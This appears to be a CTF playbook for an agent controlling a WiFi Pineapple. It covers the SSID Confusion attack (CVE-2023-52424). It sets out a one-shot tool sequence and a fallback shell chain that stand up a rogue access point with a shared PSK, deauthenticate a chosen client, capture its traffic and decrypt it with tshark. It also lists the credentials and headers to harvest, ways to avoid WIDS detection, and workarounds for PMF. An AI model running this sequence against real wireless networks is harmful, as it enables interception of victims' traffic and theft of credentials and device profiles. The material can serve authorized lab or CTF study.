# SSID Confusion flag — client thinks it's on X, is on Y

CVE-2023-52424. The 4-way handshake doesn't authenticate the SSID.
Client-side policy (VPN toggle, MDM profile, per-SSID trust) reads
the wrong SSID string. Flag surface is whatever the client sends
when it believes it's on the trusted network.

## Recognition

Prerequisite: two networks in the environment share a PSK. Recognize:

- Multiple SSIDs, same beacon Vendor-IE fingerprint (same infra).
- WPA2-PSK on both.
- A client that shows evidence of per-SSID trust policy — probe
  requests naming a "trusted" SSID + a "guest" SSID.

## The one-shot sequence

```python
run_sequence([
    {"action": "recon_start", "band": "2.4", "dwell_ms": 250},
    {"action": "wait", "s": 15},
    {"action": "recon_stop"},

    # 1. Stand up the rogue on SSID Y (guest) with the same PSK as X (corp).
    {"action": "hostapd_up",
     "ssid": "GuestNet",
     "channel": 6,
     "wpa": 2,
     "wpa_key_mgmt": "WPA-PSK",
     "wpa_passphrase": "<shared PSK>"},

    # 2. Push client off SSID X if PMF permits, else wait.
    {"action": "deauth_targeted",
     "bssid": "<real-corp-BSSID>",
     "client": "11:22:33:44:55:66"},

    # 3. Capture the client's traffic once it associates.
    {"action": "capture_start",
     "iface": "wlan1mon",
     "channel": 6,
     "out_path": "/tmp/ssidconf.pcapng"},

    {"action": "wait", "s": 30},
    {"action": "capture_stop"},

    # 4. Decrypt with the shared PSK.
    {"action": "wireshark_decrypt",
     "pcap_path": "/tmp/ssidconf.pcapng",
     "psk": "<shared PSK>",
     "essid": "GuestNet"},
])
```

## MCP mapping / fallback

- `hostapd_up` → `server.do_create_rogue_ap(ssid, channel, security='wpa2',
  psk=<shared>)` (uses hostapd under the hood on the Pineapple).
- `deauth_targeted` → `server.do_deauth(bssid=..., client_mac=..., count=...)`.
- `capture_start` / `capture_stop`, `wireshark_decrypt` — **not in `src/`**;
  drive `tcpdump` on the Pineapple and `tshark` on the analyst host.

**Fallback shell chain:**

```bash
# 1. rogue AP on the guest SSID with the shared PSK (see hostapd conf
#    fragment in wpa3-transition-downgrade.md).
sudo hostapd /etc/hostapd/rogue-guestnet.conf &

# 2. targeted deauth (PMF-off only)
sudo aireplay-ng -0 3 -a <real-corp-BSSID> -c 11:22:33:44:55:66 wlan1mon

# 3. capture on the rogue's channel
sudo tcpdump -i wlan1mon -c 5000 -w /tmp/ssidconf.pcapng \
    "wlan addr1 11:22:33:44:55:66 or wlan addr2 11:22:33:44:55:66"

# 4. offline decrypt with the shared PSK
tshark -r /tmp/ssidconf.pcapng \
    -o "wlan.enable_decryption:TRUE" \
    -o 'uat:80211_keys:"wpa-pwd","<shared PSK>:GuestNet"' \
    -Y "http.request or http.response or dns" -V
```

## The flag surface

- **Authorization header** the client sends assuming it's on Corp.
- **MDM sync payload** — a device profile with credentials.
- **Preference sync** — the client sends metadata it wouldn't send
  on an untrusted network.
- **VPN turn-off signal** — the client behaves as if the transport is
  trusted; the flag is embedded in the traffic that a VPN would
  otherwise have hidden.

## What makes this hard to detect

A WIDS sees "GuestNet" and "CorpWiFi" as normal APs. The confusion is
at the client's higher-layer policy. From RF perspective the twin is
clean — different SSID, different BSSID, correct handshake.

## Failure modes

- **PSKs differ.** Attack does not apply.
- **Client validates BSSID + SSID against stored profile.** Some
  2025+ Linux iwd builds do. Most iOS/Android don't (as of the 2024
  paper).
- **PMF-required on Corp AP.** Deauth can't push the client. Rely on
  RSSI dominance — the rogue must be louder at the client than the
  real corp AP.

## What still works when PMF-required

SSID Confusion is *the* PMF-required-safe attack — the 4-way
handshake doesn't authenticate the SSID string, and the trigger
is the client's own reconnect logic. The one-shot above uses
`deauth_targeted` as step 2 only to accelerate; on a PMF-required
target that step is a no-op but the attack still lands:

- **Drop the deauth entirely.** The client will re-select on its
  next natural roam / wake / band-steer. Extend the capture
  window and wait.
- **RSSI dominance is the actual lever.** The rogue on GuestNet
  has to out-signal the real Corp AP at the client. Position
  matters more than deauth ever did.
- **Same-PSK-across-SSIDs is the precondition, not PMF.** PMF's
  scope is mgmt-frame integrity between an associated pair; SSID
  confusion attacks the *client's own trust policy* about which
  SSID string means what. That policy runs above PMF.
- **6 GHz variant.** On 6 GHz, PMF is mandatory but WPA3-SAE
  (with per-connection PMKs) is common — SSID Confusion still
  works if the venue mirrors the same SAE credential across two
  SSIDs (common for guest / corp splits). See Vanhoef &
  Yseboodt 2024 §5.
- **BTM cooperation.** If Corp AP honors BTM Requests, hint the
  client toward GuestNet's BSSID — cooperative roam, no deauth.

## Cite

- attacks.json: `ssid-confusion-cve-2023-52424`,
  `btm-forced-roam`.
- Vanhoef & Yseboodt 2024.
- cves.json: CVE-2023-52424.
- knowledge/ctf/pmf-required-targets.md.
